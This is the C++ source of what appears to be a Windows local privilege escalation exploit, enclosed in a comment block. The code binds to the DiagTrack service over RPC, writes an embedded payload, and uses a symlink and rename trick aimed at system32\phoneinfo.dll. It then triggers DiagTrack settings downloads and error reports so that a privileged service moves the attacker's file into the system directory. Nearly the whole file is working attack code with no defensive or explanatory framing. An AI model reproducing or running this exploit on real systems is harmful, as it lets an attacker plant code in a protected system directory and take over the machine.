/*
#include <exploitLib/exploitLib.h>
#include <exploitLib/primitives.h>
#include <exploitLib/projfs.h>
#include "resource.h"
#include "DiagTrack1.h"
#include "exploitLib/IPC//WER.h"

#pragma comment(lib, "rpcrt4.lib")

RPC_BINDING_HANDLE g_hBinding = INVALID_HANDLE_VALUE;

using namespace x::literalNS;

#define DEBUG TRUE

RPC_STATUS CreateBindingHandle(LPCWSTR pwszUuid, RPC_BINDING_HANDLE* phBinding)
{
	RPC_WSTR stringBinding;
	RPC_STATUS rpcStatus;

	rpcStatus = RpcStringBindingCompose((RPC_WSTR)pwszUuid, (RPC_WSTR)L"ncalrpc", nullptr, nullptr, nullptr, &stringBinding);
	if (rpcStatus == RPC_S_OK)
	{
		if (DEBUG) { wprintf(L"[DEBUG] RpcStringBindingCompose() OK\n"); }

		rpcStatus = RpcBindingFromStringBinding(stringBinding, phBinding);
		if (rpcStatus == RPC_S_OK)
		{
			if (DEBUG) { wprintf(L"[DEBUG] RpcBindingFromStringBinding() OK\n"); }
		}
		else
		{
			wprintf(L"[-] RpcBindingFromStringBinding() failed (Err: 0x%08X)\n", rpcStatus);
		}

		rpcStatus = RpcStringFree(&stringBinding);
		if (rpcStatus == RPC_S_OK)
		{
			if (DEBUG) { wprintf(L"[DEBUG] RpcStringFree() OK\n"); }
		}
		else
		{
			wprintf(L"[-] RpcStringFree() failed (Err: 0x%08X)\n", rpcStatus);
		}
	}
	else
	{
		wprintf(L"[-] RpcStringBindingCompose() failed (Err: 0x%08X)\n", rpcStatus);
	}

	return rpcStatus;
}

RPC_STATUS CloseBindingHandle(RPC_BINDING_HANDLE* phBinding)
{
	RPC_STATUS rpcStatus;

	rpcStatus = RpcBindingFree(phBinding);
	if (rpcStatus == RPC_S_OK)
	{
		if (DEBUG) { wprintf(L"[DEBUG] RpcBindingFree() OK\n"); }
	}
	else
	{
		wprintf(L"[-] RpcBindingFree() failed (Err: 0x%08X)\n", rpcStatus);
	}

	return rpcStatus;
}

extern "C" void __RPC_FAR * __RPC_USER midl_user_allocate(size_t len)
{
	return(malloc(len));
}

extern "C" void __RPC_USER midl_user_free(void __RPC_FAR * ptr)
{
	free(ptr);
}

int main(int argc, const char* args[])
try
{
   virtualRoot vroot{ "%LOCALAPPDATA%\\Packages\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\LocalState\\Tips\\" };
   x::writePayloadToFile< EMBEDDED_PAYLOAD >("%LOCALAPPDATA%\\Packages\\1.xml"_p);

   x::file tmpFolder{ "%TEMP%"_p / x::guid::random_guid() , FILE_READ_ATTRIBUTES,FILE_DIRECTORY_FILE };
   virtualRoot vroot2{ tmpFolder.getFinalPath() };
   vroot2.makeSymlink("temp", "%WINDIR%\\system32\\phoneinfo.dll"_p, false);
   x::file{ tmpFolder / "temp"_p, DELETE,FILE_OPEN_REPARSE_POINT }.rename("%PROGRAMDATA%\\1.xml"_p);
	 
	HRESULT hRes;

	hRes = CreateBindingHandle(L"4c9dbf19-d39e-4bb9-90ee-8f7179b20283", &g_hBinding);
	if (FAILED(hRes))
	{
		wprintf(L"[-] Failed to create binding handle.\n");
		return 2;
	}

	wprintf(L"[*] RPC connection OK\n");

	// This call isn't mandatory but makes the exploit more reliable.
	hRes = DownloadLatestSettings(g_hBinding, 1, 1);
	if (FAILED(hRes))
	{
		wprintf(L"[-] DownloadLatestSettings() failed (Err: 0x%08X)\n", hRes);
		return 3;
	}

	wprintf(L"[*] DiagTrack service OK\n");

	submitBlankReport();
	

   getchar();
 
   return 0;
}
catch (wil::ResultException& e)
{
   std::wcout << _com_error{ (HRESULT)RtlNtStatusToDosError(e.GetErrorCode()) }.ErrorMessage() << std::endl;
   std::wcout << e.what() << std::endl;
}
catch (std::exception& e)
{
   std::wcout << e.what() << std::endl;
}
*/